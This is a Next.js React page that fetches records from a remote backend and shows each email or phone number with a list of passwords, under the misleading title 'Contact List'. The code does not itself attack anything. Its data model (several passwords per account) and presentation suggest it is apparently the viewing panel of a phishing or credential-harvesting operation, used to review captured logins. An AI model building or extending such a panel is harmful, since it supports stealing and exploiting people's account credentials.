'use client';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState } from 'react';

export default function Home() {
  const [gettingData, setGettingData] = useState(true);
  const [data, setData] =
    useState<{ _id: string; email: string; password: string[] }[]>();

  useEffect(() => {
    (async () => {
      try {
        const response = await axios.get('https://to-del-be.onrender.com');
        console.log('res', response.data);
        setData(response.data.data);
      } finally {
        setGettingData(false);
      }
    })();
  }, []);

  if (gettingData)
    return (
      <div className="w-full h-screen flex justify-center items-center bg-gray-900">
        <Image
          src={'/spinner.svg'}
          alt="spinner"
          width={40}
          height={40}
          className="animate-spin"
        />
      </div>
    );

  if (!data?.length)
    return (
      <div className="w-full h-screen flex justify-center items-center bg-gray-900">
        <div className="text-center">
          <h2 className="text-2xl font-bold text-gray-700">
            No Data Available
          </h2>
          <p className="text-gray-500 mt-2">
            Try refreshing or come back later.
          </p>
        </div>
      </div>
    );

  return (
    <div className="p-8 bg-gray-900 text-white min-h-screen flex flex-col justify-between">
      <div>
        <h1 className="text-3xl font-bold text-center text-teal-400 mb-9">
          Contact List
        </h1>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-2 xl:grid-cols-3 gap-3">
          {data?.map((data, index) => (
            <div
              key={index}
              className="bg-gray-800 p-5 rounded-lg shadow-lg hover:shadow-xl"
            >
              <div className="flex justify-between items-center">
                <p className="text-sm text-gray-400">Email/Phone Number:</p>
                <p className="text-sm text-gray-200">{data.email}</p>
              </div>
              <div className="flex justify-between items-center mt-2">
                <p className="text-sm text-gray-400">Passwords:</p>
                <p className="text-sm text-gray-200">
                  {data.password.join(', ')}
                </p>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
